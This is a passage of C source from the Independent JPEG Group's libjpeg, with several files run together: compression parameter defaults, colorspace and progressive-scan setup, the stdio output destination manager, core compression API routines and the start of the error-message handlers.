      0x59, 0x5a, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
      0x69, 0x6a, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
      0x79, 0x7a, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
      0x88, 0x89, 0x8a, 0x92, 0x93, 0x94, 0x95, 0x96,
      0x97, 0x98, 0x99, 0x9a, 0xa2, 0xa3, 0xa4, 0xa5,
      0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xb2, 0xb3, 0xb4,
      0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xc2, 0xc3,
      0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xd2,
      0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda,
      0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9,
      0xea, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
      0xf9, 0xfa };
  
  add_huff_table(cinfo, &cinfo->dc_huff_tbl_ptrs[0],
		 bits_dc_luminance, val_dc_luminance);
  add_huff_table(cinfo, &cinfo->ac_huff_tbl_ptrs[0],
		 bits_ac_luminance, val_ac_luminance);
  add_huff_table(cinfo, &cinfo->dc_huff_tbl_ptrs[1],
		 bits_dc_chrominance, val_dc_chrominance);
  add_huff_table(cinfo, &cinfo->ac_huff_tbl_ptrs[1],
		 bits_ac_chrominance, val_ac_chrominance);
}


/*
 * Default parameter setup for compression.
 *
 * Applications that don't choose to use this routine must do their
 * own setup of all these parameters.  Alternately, you can call this
 * to establish defaults and then alter parameters selectively.  This
 * is the recommended approach since, if we add any new parameters,
 * your code will still work (they'll be set to reasonable defaults).
 */

GLOBAL(void)
jpeg_set_defaults (j_compress_ptr cinfo)
{
  int i;

  /* Safety check to ensure start_compress not called yet. */
  if (cinfo->global_state != CSTATE_START)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);

  /* Allocate comp_info array large enough for maximum component count.
   * Array is made permanent in case application wants to compress
   * multiple images at same param settings.
   */
  if (cinfo->comp_info == NULL)
    cinfo->comp_info = (jpeg_component_info *)
      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,
				  MAX_COMPONENTS * SIZEOF(jpeg_component_info));

  /* Initialize everything not dependent on the color space */

  cinfo->data_precision = BITS_IN_JSAMPLE;
  /* Set up two quantization tables using default quality of 75 */
  jpeg_set_quality(cinfo, 75, TRUE);
  /* Set up two Huffman tables */
  std_huff_tables(cinfo);

  /* Initialize default arithmetic coding conditioning */
  for (i = 0; i < NUM_ARITH_TBLS; i++) {
    cinfo->arith_dc_L[i] = 0;
    cinfo->arith_dc_U[i] = 1;
    cinfo->arith_ac_K[i] = 5;
  }

  /* Default is no multiple-scan output */
  cinfo->scan_info = NULL;
  cinfo->num_scans = 0;

  /* Expect normal source image, not raw downsampled data */
  cinfo->raw_data_in = FALSE;

  /* Use Huffman coding, not arithmetic coding, by default */
  cinfo->arith_code = FALSE;

  /* By default, don't do extra passes to optimize entropy coding */
  cinfo->optimize_coding = FALSE;
  /* The standard Huffman tables are only valid for 8-bit data precision.
   * If the precision is higher, force optimization on so that usable
   * tables will be computed.  This test can be removed if default tables
   * are supplied that are valid for the desired precision.
   */
  if (cinfo->data_precision > 8)
    cinfo->optimize_coding = TRUE;

  /* By default, use the simpler non-cosited sampling alignment */
  cinfo->CCIR601_sampling = FALSE;

  /* No input smoothing */
  cinfo->smoothing_factor = 0;

  /* DCT algorithm preference */
  cinfo->dct_method = JDCT_DEFAULT;

  /* No restart markers */
  cinfo->restart_interval = 0;
  cinfo->restart_in_rows = 0;

  /* Fill in default JFIF marker parameters.  Note that whether the marker
   * will actually be written is determined by jpeg_set_colorspace.
   *
   * By default, the library emits JFIF version code 1.01.
   * An application that wants to emit JFIF 1.02 extension markers should set
   * JFIF_minor_version to 2.  We could probably get away with just defaulting
   * to 1.02, but there may still be some decoders in use that will complain
   * about that; saying 1.01 should minimize compatibility problems.
   */
  cinfo->JFIF_major_version = 1; /* Default JFIF version = 1.01 */
  cinfo->JFIF_minor_version = 1;
  cinfo->density_unit = 0;	/* Pixel size is unknown by default */
  cinfo->X_density = 1;		/* Pixel aspect ratio is square by default */
  cinfo->Y_density = 1;

  /* Choose JPEG colorspace based on input space, set defaults accordingly */

  jpeg_default_colorspace(cinfo);
}


/*
 * Select an appropriate JPEG colorspace for in_color_space.
 */

GLOBAL(void)
jpeg_default_colorspace (j_compress_ptr cinfo)
{
  switch (cinfo->in_color_space) {
  case JCS_GRAYSCALE:
    jpeg_set_colorspace(cinfo, JCS_GRAYSCALE);
    break;
  case JCS_RGB:
    jpeg_set_colorspace(cinfo, JCS_YCbCr);
    break;
  case JCS_YCbCr:
    jpeg_set_colorspace(cinfo, JCS_YCbCr);
    break;
  case JCS_CMYK:
    jpeg_set_colorspace(cinfo, JCS_CMYK); /* By default, no translation */
    break;
  case JCS_YCCK:
    jpeg_set_colorspace(cinfo, JCS_YCCK);
    break;
  case JCS_UNKNOWN:
    jpeg_set_colorspace(cinfo, JCS_UNKNOWN);
    break;
  default:
    ERREXIT(cinfo, JERR_BAD_IN_COLORSPACE);
  }
}


/*
 * Set the JPEG colorspace, and choose colorspace-dependent default values.
 */

GLOBAL(void)
jpeg_set_colorspace (j_compress_ptr cinfo, J_COLOR_SPACE colorspace)
{
  jpeg_component_info * compptr;
  int ci;

#define SET_COMP(index,id,hsamp,vsamp,quant,dctbl,actbl)  \
  (compptr = &cinfo->comp_info[index], \
   compptr->component_id = (id), \
   compptr->h_samp_factor = (hsamp), \
   compptr->v_samp_factor = (vsamp), \
   compptr->quant_tbl_no = (quant), \
   compptr->dc_tbl_no = (dctbl), \
   compptr->ac_tbl_no = (actbl) )

  /* Safety check to ensure start_compress not called yet. */
  if (cinfo->global_state != CSTATE_START)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);

  /* For all colorspaces, we use Q and Huff tables 0 for luminance components,
   * tables 1 for chrominance components.
   */

  cinfo->jpeg_color_space = colorspace;

  cinfo->write_JFIF_header = FALSE; /* No marker for non-JFIF colorspaces */
  cinfo->write_Adobe_marker = FALSE; /* write no Adobe marker by default */

  switch (colorspace) {
  case JCS_GRAYSCALE:
    cinfo->write_JFIF_header = TRUE; /* Write a JFIF marker */
    cinfo->num_components = 1;
    /* JFIF specifies component ID 1 */
    SET_COMP(0, 1, 1,1, 0, 0,0);
    break;
  case JCS_RGB:
    cinfo->write_Adobe_marker = TRUE; /* write Adobe marker to flag RGB */
    cinfo->num_components = 3;
    SET_COMP(0, 0x52 /* 'R' */, 1,1, 0, 0,0);
    SET_COMP(1, 0x47 /* 'G' */, 1,1, 0, 0,0);
    SET_COMP(2, 0x42 /* 'B' */, 1,1, 0, 0,0);
    break;
  case JCS_YCbCr:
    cinfo->write_JFIF_header = TRUE; /* Write a JFIF marker */
    cinfo->num_components = 3;
    /* JFIF specifies component IDs 1,2,3 */
    /* We default to 2x2 subsamples of chrominance */
    SET_COMP(0, 1, 2,2, 0, 0,0);
    SET_COMP(1, 2, 1,1, 1, 1,1);
    SET_COMP(2, 3, 1,1, 1, 1,1);
    break;
  case JCS_CMYK:
    cinfo->write_Adobe_marker = TRUE; /* write Adobe marker to flag CMYK */
    cinfo->num_components = 4;
    SET_COMP(0, 0x43 /* 'C' */, 1,1, 0, 0,0);
    SET_COMP(1, 0x4D /* 'M' */, 1,1, 0, 0,0);
    SET_COMP(2, 0x59 /* 'Y' */, 1,1, 0, 0,0);
    SET_COMP(3, 0x4B /* 'K' */, 1,1, 0, 0,0);
    break;
  case JCS_YCCK:
    cinfo->write_Adobe_marker = TRUE; /* write Adobe marker to flag YCCK */
    cinfo->num_components = 4;
    SET_COMP(0, 1, 2,2, 0, 0,0);
    SET_COMP(1, 2, 1,1, 1, 1,1);
    SET_COMP(2, 3, 1,1, 1, 1,1);
    SET_COMP(3, 4, 2,2, 0, 0,0);
    break;
  case JCS_UNKNOWN:
    cinfo->num_components = cinfo->input_components;
    if (cinfo->num_components < 1 || cinfo->num_components > MAX_COMPONENTS)
      ERREXIT2(cinfo, JERR_COMPONENT_COUNT, cinfo->num_components,
	       MAX_COMPONENTS);
    for (ci = 0; ci < cinfo->num_components; ci++) {
      SET_COMP(ci, ci, 1,1, 0, 0,0);
    }
    break;
  default:
    ERREXIT(cinfo, JERR_BAD_J_COLORSPACE);
  }
}


#ifdef C_PROGRESSIVE_SUPPORTED

LOCAL(jpeg_scan_info *)
fill_a_scan (jpeg_scan_info * scanptr, int ci,
	     int Ss, int Se, int Ah, int Al)
/* Support routine: generate one scan for specified component */
{
  scanptr->comps_in_scan = 1;
  scanptr->component_index[0] = ci;
  scanptr->Ss = Ss;
  scanptr->Se = Se;
  scanptr->Ah = Ah;
  scanptr->Al = Al;
  scanptr++;
  return scanptr;
}

LOCAL(jpeg_scan_info *)
fill_scans (jpeg_scan_info * scanptr, int ncomps,
	    int Ss, int Se, int Ah, int Al)
/* Support routine: generate one scan for each component */
{
  int ci;

  for (ci = 0; ci < ncomps; ci++) {
    scanptr->comps_in_scan = 1;
    scanptr->component_index[0] = ci;
    scanptr->Ss = Ss;
    scanptr->Se = Se;
    scanptr->Ah = Ah;
    scanptr->Al = Al;
    scanptr++;
  }
  return scanptr;
}

LOCAL(jpeg_scan_info *)
fill_dc_scans (jpeg_scan_info * scanptr, int ncomps, int Ah, int Al)
/* Support routine: generate interleaved DC scan if possible, else N scans */
{
  int ci;

  if (ncomps <= MAX_COMPS_IN_SCAN) {
    /* Single interleaved DC scan */
    scanptr->comps_in_scan = ncomps;
    for (ci = 0; ci < ncomps; ci++)
      scanptr->component_index[ci] = ci;
    scanptr->Ss = scanptr->Se = 0;
    scanptr->Ah = Ah;
    scanptr->Al = Al;
    scanptr++;
  } else {
    /* Noninterleaved DC scan for each component */
    scanptr = fill_scans(scanptr, ncomps, 0, 0, Ah, Al);
  }
  return scanptr;
}


/*
 * Create a recommended progressive-JPEG script.
 * cinfo->num_components and cinfo->jpeg_color_space must be correct.
 */

GLOBAL(void)
jpeg_simple_progression (j_compress_ptr cinfo)
{
  int ncomps = cinfo->num_components;
  int nscans;
  jpeg_scan_info * scanptr;

  /* Safety check to ensure start_compress not called yet. */
  if (cinfo->global_state != CSTATE_START)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);

  /* Figure space needed for script.  Calculation must match code below! */
  if (ncomps == 3 && cinfo->jpeg_color_space == JCS_YCbCr) {
    /* Custom script for YCbCr color images. */
    nscans = 10;
  } else {
    /* All-purpose script for other color spaces. */
    if (ncomps > MAX_COMPS_IN_SCAN)
      nscans = 6 * ncomps;	/* 2 DC + 4 AC scans per component */
    else
      nscans = 2 + 4 * ncomps;	/* 2 DC scans; 4 AC scans per component */
  }

  /* Allocate space for script.
   * We need to put it in the permanent pool in case the application performs
   * multiple compressions without changing the settings.  To avoid a memory
   * leak if jpeg_simple_progression is called repeatedly for the same JPEG
   * object, we try to re-use previously allocated space, and we allocate
   * enough space to handle YCbCr even if initially asked for grayscale.
   */
  if (cinfo->script_space == NULL || cinfo->script_space_size < nscans) {
    cinfo->script_space_size = MAX(nscans, 10);
    cinfo->script_space = (jpeg_scan_info *)
      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,
			cinfo->script_space_size * SIZEOF(jpeg_scan_info));
  }
  scanptr = cinfo->script_space;
  cinfo->scan_info = scanptr;
  cinfo->num_scans = nscans;

  if (ncomps == 3 && cinfo->jpeg_color_space == JCS_YCbCr) {
    /* Custom script for YCbCr color images. */
    /* Initial DC scan */
    scanptr = fill_dc_scans(scanptr, ncomps, 0, 1);
    /* Initial AC scan: get some luma data out in a hurry */
    scanptr = fill_a_scan(scanptr, 0, 1, 5, 0, 2);
    /* Chroma data is too small to be worth expending many scans on */
    scanptr = fill_a_scan(scanptr, 2, 1, 63, 0, 1);
    scanptr = fill_a_scan(scanptr, 1, 1, 63, 0, 1);
    /* Complete spectral selection for luma AC */
    scanptr = fill_a_scan(scanptr, 0, 6, 63, 0, 2);
    /* Refine next bit of luma AC */
    scanptr = fill_a_scan(scanptr, 0, 1, 63, 2, 1);
    /* Finish DC successive approximation */
    scanptr = fill_dc_scans(scanptr, ncomps, 1, 0);
    /* Finish AC successive approximation */
    scanptr = fill_a_scan(scanptr, 2, 1, 63, 1, 0);
    scanptr = fill_a_scan(scanptr, 1, 1, 63, 1, 0);
    /* Luma bottom bit comes last since it's usually largest scan */
    scanptr = fill_a_scan(scanptr, 0, 1, 63, 1, 0);
  } else {
    /* All-purpose script for other color spaces. */
    /* Successive approximation first pass */
    scanptr = fill_dc_scans(scanptr, ncomps, 0, 1);
    scanptr = fill_scans(scanptr, ncomps, 1, 5, 0, 2);
    scanptr = fill_scans(scanptr, ncomps, 6, 63, 0, 2);
    /* Successive approximation second pass */
    scanptr = fill_scans(scanptr, ncomps, 1, 63, 2, 1);
    /* Successive approximation final pass */
    scanptr = fill_dc_scans(scanptr, ncomps, 1, 0);
    scanptr = fill_scans(scanptr, ncomps, 1, 63, 1, 0);
  }
}

#endif /* C_PROGRESSIVE_SUPPORTED */
/*
 * jdatadst.c
 *
 * Copyright (C) 1994-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains compression data destination routines for the case of
 * emitting JPEG data to a file (or any stdio stream).  While these routines
 * are sufficient for most applications, some will want to use a different
 * destination manager.
 * IMPORTANT: we assume that fwrite() will correctly transcribe an array of
 * JOCTETs into 8-bit-wide elements on external storage.  If char is wider
 * than 8 bits on your machine, you may need to do some tweaking.
 */

/* this is not a core library module, so it doesn't define JPEG_INTERNALS */
#include "jerror.h"


/* Expanded data destination object for stdio output */

typedef struct {
  struct jpeg_destination_mgr pub; /* public fields */

  FILE * outfile;		/* target stream */
  JOCTET * buffer;		/* start of buffer */
} my_destination_mgr;

typedef my_destination_mgr * my_dest_ptr;

#define OUTPUT_BUF_SIZE  4096	/* choose an efficiently fwrite'able size */


/*
 * Initialize destination --- called by jpeg_start_compress
 * before any data is actually written.
 */

METHODDEF(void)
init_destination (j_compress_ptr cinfo)
{
  my_dest_ptr dest = (my_dest_ptr) cinfo->dest;

  /* Allocate the output buffer --- it will be released when done with image */
  dest->buffer = (JOCTET *)
      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				  OUTPUT_BUF_SIZE * SIZEOF(JOCTET));

  dest->pub.next_output_byte = dest->buffer;
  dest->pub.free_in_buffer = OUTPUT_BUF_SIZE;
}


/*
 * Empty the output buffer --- called whenever buffer fills up.
 *
 * In typical applications, this should write the entire output buffer
 * (ignoring the current state of next_output_byte & free_in_buffer),
 * reset the pointer & count to the start of the buffer, and return TRUE
 * indicating that the buffer has been dumped.
 *
 * In applications that need to be able to suspend compression due to output
 * overrun, a FALSE return indicates that the buffer cannot be emptied now.
 * In this situation, the compressor will return to its caller (possibly with
 * an indication that it has not accepted all the supplied scanlines).  The
 * application should resume compression after it has made more room in the
 * output buffer.  Note that there are substantial restrictions on the use of
 * suspension --- see the documentation.
 *
 * When suspending, the compressor will back up to a convenient restart point
 * (typically the start of the current MCU). next_output_byte & free_in_buffer
 * indicate where the restart point will be if the current call returns FALSE.
 * Data beyond this point will be regenerated after resumption, so do not
 * write it out when emptying the buffer externally.
 */

METHODDEF(boolean)
empty_output_buffer (j_compress_ptr cinfo)
{
  my_dest_ptr dest = (my_dest_ptr) cinfo->dest;

  if (JFWRITE(dest->outfile, dest->buffer, OUTPUT_BUF_SIZE) !=
      (size_t) OUTPUT_BUF_SIZE)
    ERREXIT(cinfo, JERR_FILE_WRITE);

  dest->pub.next_output_byte = dest->buffer;
  dest->pub.free_in_buffer = OUTPUT_BUF_SIZE;

  return TRUE;
}


/*
 * Terminate destination --- called by jpeg_finish_compress
 * after all data has been written.  Usually needs to flush buffer.
 *
 * NB: *not* called by jpeg_abort or jpeg_destroy; surrounding
 * application must deal with any cleanup that should happen even
 * for error exit.
 */

METHODDEF(void)
term_destination (j_compress_ptr cinfo)
{
  my_dest_ptr dest = (my_dest_ptr) cinfo->dest;
  size_t datacount = OUTPUT_BUF_SIZE - dest->pub.free_in_buffer;

  /* Write any data remaining in the buffer */
  if (datacount > 0) {
    if (JFWRITE(dest->outfile, dest->buffer, datacount) != datacount)
      ERREXIT(cinfo, JERR_FILE_WRITE);
  }
  fflush(dest->outfile);
  /* Make sure we wrote the output file OK */
  if (ferror(dest->outfile))
    ERREXIT(cinfo, JERR_FILE_WRITE);
}


/*
 * Prepare for output to a stdio stream.
 * The caller must have already opened the stream, and is responsible
 * for closing it after finishing compression.
 */

GLOBAL(void)
jpeg_stdio_dest (j_compress_ptr cinfo, FILE * outfile)
{
  my_dest_ptr dest;

  /* The destination object is made permanent so that multiple JPEG images
   * can be written to the same file without re-executing jpeg_stdio_dest.
   * This makes it dangerous to use this manager and a different destination
   * manager serially with the same JPEG object, because their private object
   * sizes may be different.  Caveat programmer.
   */
  if (cinfo->dest == NULL) {	/* first time for this JPEG object? */
    cinfo->dest = (struct jpeg_destination_mgr *)
      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,
				  SIZEOF(my_destination_mgr));
  }

  dest = (my_dest_ptr) cinfo->dest;
  dest->pub.init_destination = init_destination;
  dest->pub.empty_output_buffer = empty_output_buffer;
  dest->pub.term_destination = term_destination;
  dest->outfile = outfile;
}
/*
 * jcapimin.c
 *
 * Copyright (C) 1994-1998, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains application interface code for the compression half
 * of the JPEG library.  These are the "minimum" API routines that may be
 * needed in either the normal full-compression case or the transcoding-only
 * case.
 *
 * Most of the routines intended to be called directly by an application
 * are in this file or in jcapistd.c.  But also see jcparam.c for
 * parameter-setup helper routines, jcomapi.c for routines shared by
 * compression and decompression, and jctrans.c for the transcoding case.
 */


/*
 * Initialization of a JPEG compression object.
 * The error manager must already be set up (in case memory manager fails).
 */

GLOBAL(void)
jpeg_CreateCompress (j_compress_ptr cinfo, int version, size_t structsize)
{
  int i;

  /* Guard against version mismatches between library and caller. */
  cinfo->mem = NULL;		/* so jpeg_destroy knows mem mgr not called */
  if (version != JPEG_LIB_VERSION)
    ERREXIT2(cinfo, JERR_BAD_LIB_VERSION, JPEG_LIB_VERSION, version);
  if (structsize != SIZEOF(struct jpeg_compress_struct))
    ERREXIT2(cinfo, JERR_BAD_STRUCT_SIZE, 
	     (int) SIZEOF(struct jpeg_compress_struct), (int) structsize);

  /* For debugging purposes, we zero the whole master structure.
   * But the application has already set the err pointer, and may have set
   * client_data, so we have to save and restore those fields.
   * Note: if application hasn't set client_data, tools like Purify may
   * complain here.
   */
  {
    struct jpeg_error_mgr * err = cinfo->err;
    void * client_data = cinfo->client_data; /* ignore Purify complaint here */
    MEMZERO(cinfo, SIZEOF(struct jpeg_compress_struct));
    cinfo->err = err;
    cinfo->client_data = client_data;
  }
  cinfo->is_decompressor = FALSE;

  /* Initialize a memory manager instance for this object */
  jinit_memory_mgr((j_common_ptr) cinfo);

  /* Zero out pointers to permanent structures. */
  cinfo->progress = NULL;
  cinfo->dest = NULL;

  cinfo->comp_info = NULL;

  for (i = 0; i < NUM_QUANT_TBLS; i++)
    cinfo->quant_tbl_ptrs[i] = NULL;

  for (i = 0; i < NUM_HUFF_TBLS; i++) {
    cinfo->dc_huff_tbl_ptrs[i] = NULL;
    cinfo->ac_huff_tbl_ptrs[i] = NULL;
  }

  cinfo->script_space = NULL;

  cinfo->input_gamma = 1.0;	/* in case application forgets */

  /* OK, I'm ready */
  cinfo->global_state = CSTATE_START;
}


/*
 * Destruction of a JPEG compression object
 */

GLOBAL(void)
jpeg_destroy_compress (j_compress_ptr cinfo)
{
  jpeg_destroy((j_common_ptr) cinfo); /* use common routine */
}


/*
 * Abort processing of a JPEG compression operation,
 * but don't destroy the object itself.
 */

GLOBAL(void)
jpeg_abort_compress (j_compress_ptr cinfo)
{
  jpeg_abort((j_common_ptr) cinfo); /* use common routine */
}


/*
 * Forcibly suppress or un-suppress all quantization and Huffman tables.
 * Marks all currently defined tables as already written (if suppress)
 * or not written (if !suppress).  This will control whether they get emitted
 * by a subsequent jpeg_start_compress call.
 *
 * This routine is exported for use by applications that want to produce
 * abbreviated JPEG datastreams.  It logically belongs in jcparam.c, but
 * since it is called by jpeg_start_compress, we put it here --- otherwise
 * jcparam.o would be linked whether the application used it or not.
 */

GLOBAL(void)
jpeg_suppress_tables (j_compress_ptr cinfo, boolean suppress)
{
  int i;
  JQUANT_TBL * qtbl;
  JHUFF_TBL * htbl;

  for (i = 0; i < NUM_QUANT_TBLS; i++) {
    if ((qtbl = cinfo->quant_tbl_ptrs[i]) != NULL)
      qtbl->sent_table = suppress;
  }

  for (i = 0; i < NUM_HUFF_TBLS; i++) {
    if ((htbl = cinfo->dc_huff_tbl_ptrs[i]) != NULL)
      htbl->sent_table = suppress;
    if ((htbl = cinfo->ac_huff_tbl_ptrs[i]) != NULL)
      htbl->sent_table = suppress;
  }
}


/*
 * Finish JPEG compression.
 *
 * If a multipass operating mode was selected, this may do a great deal of
 * work including most of the actual output.
 */

GLOBAL(void)
jpeg_finish_compress (j_compress_ptr cinfo)
{
  JDIMENSION iMCU_row;

  if (cinfo->global_state == CSTATE_SCANNING ||
      cinfo->global_state == CSTATE_RAW_OK) {
    /* Terminate first pass */
    if (cinfo->next_scanline < cinfo->image_height)
      ERREXIT(cinfo, JERR_TOO_LITTLE_DATA);
    (*cinfo->master->finish_pass) (cinfo);
  } else if (cinfo->global_state != CSTATE_WRCOEFS)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);
  /* Perform any remaining passes */
  while (! cinfo->master->is_last_pass) {
    (*cinfo->master->prepare_for_pass) (cinfo);
    for (iMCU_row = 0; iMCU_row < cinfo->total_iMCU_rows; iMCU_row++) {
      if (cinfo->progress != NULL) {
	cinfo->progress->pass_counter = (long) iMCU_row;
	cinfo->progress->pass_limit = (long) cinfo->total_iMCU_rows;
	(*cinfo->progress->progress_monitor) ((j_common_ptr) cinfo);
      }
      /* We bypass the main controller and invoke coef controller directly;
       * all work is being done from the coefficient buffer.
       */
      if (! (*cinfo->coef->compress_data) (cinfo, (JSAMPIMAGE) NULL))
	ERREXIT(cinfo, JERR_CANT_SUSPEND);
    }
    (*cinfo->master->finish_pass) (cinfo);
  }
  /* Write EOI, do final cleanup */
  (*cinfo->marker->write_file_trailer) (cinfo);
  (*cinfo->dest->term_destination) (cinfo);
  /* We can use jpeg_abort to release memory and reset global_state */
  jpeg_abort((j_common_ptr) cinfo);
}


/*
 * Write a special marker.
 * This is only recommended for writing COM or APPn markers.
 * Must be called after jpeg_start_compress() and before
 * first call to jpeg_write_scanlines() or jpeg_write_raw_data().
 */

GLOBAL(void)
jpeg_write_marker (j_compress_ptr cinfo, int marker,
		   const JOCTET *dataptr, unsigned int datalen)
{
  JMETHOD(void, write_marker_byte, (j_compress_ptr info, int val));

  if (cinfo->next_scanline != 0 ||
      (cinfo->global_state != CSTATE_SCANNING &&
       cinfo->global_state != CSTATE_RAW_OK &&
       cinfo->global_state != CSTATE_WRCOEFS))
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);

  (*cinfo->marker->write_marker_header) (cinfo, marker, datalen);
  write_marker_byte = cinfo->marker->write_marker_byte;	/* copy for speed */
  while (datalen--) {
    (*write_marker_byte) (cinfo, *dataptr);
    dataptr++;
  }
}

/* Same, but piecemeal. */

GLOBAL(void)
jpeg_write_m_header (j_compress_ptr cinfo, int marker, unsigned int datalen)
{
  if (cinfo->next_scanline != 0 ||
      (cinfo->global_state != CSTATE_SCANNING &&
       cinfo->global_state != CSTATE_RAW_OK &&
       cinfo->global_state != CSTATE_WRCOEFS))
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);

  (*cinfo->marker->write_marker_header) (cinfo, marker, datalen);
}

GLOBAL(void)
jpeg_write_m_byte (j_compress_ptr cinfo, int val)
{
  (*cinfo->marker->write_marker_byte) (cinfo, val);
}


/*
 * Alternate compression function: just write an abbreviated table file.
 * Before calling this, all parameters and a data destination must be set up.
 *
 * To produce a pair of files containing abbreviated tables and abbreviated
 * image data, one would proceed as follows:
 *
 *		initialize JPEG object
 *		set JPEG parameters
 *		set destination to table file
 *		jpeg_write_tables(cinfo);
 *		set destination to image file
 *		jpeg_start_compress(cinfo, FALSE);
 *		write data...
 *		jpeg_finish_compress(cinfo);
 *
 * jpeg_write_tables has the side effect of marking all tables written
 * (same as jpeg_suppress_tables(..., TRUE)).  Thus a subsequent start_compress
 * will not re-emit the tables unless it is passed write_all_tables=TRUE.
 */

GLOBAL(void)
jpeg_write_tables (j_compress_ptr cinfo)
{
  if (cinfo->global_state != CSTATE_START)
    ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);

  /* (Re)initialize error mgr and destination modules */
  (*cinfo->err->reset_error_mgr) ((j_common_ptr) cinfo);
  (*cinfo->dest->init_destination) (cinfo);
  /* Initialize the marker writer ... bit of a crock to do it here. */
  jinit_marker_writer(cinfo);
  /* Write them tables! */
  (*cinfo->marker->write_tables_only) (cinfo);
  /* And clean up. */
  (*cinfo->dest->term_destination) (cinfo);
  /*
   * In library releases up through v6a, we called jpeg_abort() here to free
   * any working memory allocated by the destination manager and marker
   * writer.  Some applications had a problem with that: they allocated space
   * of their own from the library memory manager, and didn't want it to go
   * away during write_tables.  So now we do nothing.  This will cause a
   * memory leak if an app calls write_tables repeatedly without doing a full
   * compression cycle or otherwise resetting the JPEG object.  However, that
   * seems less bad than unexpectedly freeing memory in the normal case.
   * An app that prefers the old behavior can call jpeg_abort for itself after
   * each call to jpeg_write_tables().
   */
}
/*
 * jerror.c
 *
 * Copyright (C) 1991-1998, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains simple error-reporting and trace-message routines.
 * These are suitable for Unix-like systems and others where writing to
 * stderr is the right thing to do.  Many applications will want to replace
 * some or all of these routines.
 *
 * If you define USE_WINDOWS_MESSAGEBOX in jconfig.h or in the makefile,
 * you get a Windows-specific hack to display error messages in a dialog box.
 * It ain't much, but it beats dropping error messages into the bit bucket,
 * which is what happens to output to stderr under most Windows C compilers.
 *
 * These routines are used by both the compression and decompression code.
 */

/* this is not a core library module, so it doesn't define JPEG_INTERNALS */
#include "jversion.h"
#include "jerror.h"

#ifdef USE_WINDOWS_MESSAGEBOX
#include <windows.h>
#endif

#ifndef EXIT_FAILURE		/* define exit() codes if not provided */
#define EXIT_FAILURE  1
#endif


/*
 * Create the message string table.
 * We do this from the master message list in jerror.h by re-reading
 * jerror.h with a suitable definition for macro JMESSAGE.
 * The message table is made an external symbol just in case any applications
 * want to refer to it directly.
 */

#ifdef NEED_SHORT_EXTERNAL_NAMES
#define jpeg_std_message_table	jMsgTable
#endif

#define JMESSAGE(code,string)	string ,

const char * const jpeg_std_message_table[] = {
#include "jerror.h"
  NULL
};


/*
 * Error exit handler: must not return to caller.
 *
 * Applications may override this if they want to get control back after
 * an error.  Typically one would longjmp somewhere instead of exiting.
 * The setjmp buffer can be made a private field within an expanded error
 * handler object.  Note that the info needed to generate an error message
 * is stored in the error object, so you can generate the message now or
 * later, at your convenience.
 * You should make sure that the JPEG object is cleaned up (with jpeg_abort
 * or jpeg_destroy) at some point.
 */

METHODDEF(void)
error_exit (j_common_ptr cinfo)
{
  /* Always display the message */
  (*cinfo->err->output_message) (cinfo);

  /* Let the memory manager delete any temp files before we die */
  jpeg_destroy(cinfo);

  exit(EXIT_FAILURE);
}


/*
 * Actual output of an error or trace message.
 * Applications may override this method to send JPEG messages somewhere
 * other than stderr.
 *
 * On Windows, printing to stderr is generally completely useless,
 * so we provide optional code to produce an error-dialog popup.
 * Most Windows applications will still prefer to override this routine,
 * but if they don't, it'll do something at least marginally useful.
 *
 * NOTE: to use the library in an environment that doesn't support the
 * C stdio library, you may have to delete the call to fprintf() entirely,
 * not just not use this routine.
 */

void output_message (j_common_ptr cinfo)
{
  char buffer[JMSG_LENGTH_MAX];

  /* Create the message */
  (*cinfo->err->format_message) (cinfo, buffer);

#ifdef USE_WINDOWS_MESSAGEBOX
  /* Display it in a message dialog box */
  MessageBox(GetActiveWindow(), buffer, "JPEG Library Error",
	     MB_OK | MB_ICONERROR);
#else
  /* Send it to stderr, adding a newline */
  printf("%s\n", buffer);
#endif
}


/*
 * Decide whether to emit a trace or warning message.
 * msg_level is one of:
 *   -1: recoverable corrupt-data warning, may want to abort.
 *    0: important advisory messages (always display to user).
 *    1: first level of tracing detail.
 *    2,3,...: successively more detailed tracing messages.
 * An application might override this method if it wanted to abort on warnings
 * or change the policy about which messages to display.
 */

METHODDEF(void)
emit_message (j_common_ptr cinfo, int msg_level)
{
  struct jpeg_error_mgr * err = cinfo->err;

  if (msg_level < 0) {
    /* It's a warning message.  Since corrupt files may generate many warnings,
     * the policy implemented here is to show only the first warning,
     * unless trace_level >= 3.
     */
    if (err->num_warnings == 0 || err->trace_level >= 3)
      (*err->output_message) (cinfo);
    /* Always count warnings in num_warnings. */
    err->num_warnings++;
  } else {
    /* It's a trace message.  Show it if trace_level >= msg_level. */
    if (err->trace_level >= msg_level)
      (*err->output_message) (cinfo);
  }
}


/*
 * Format a message string for the most recent JPEG error or message.
 * The message is stored into buffer, which should be at least JMSG_LENGTH_MAX
 * characters.  Note that no '\n' character is added to the string.
 * Few applications should need to override this method.
 */

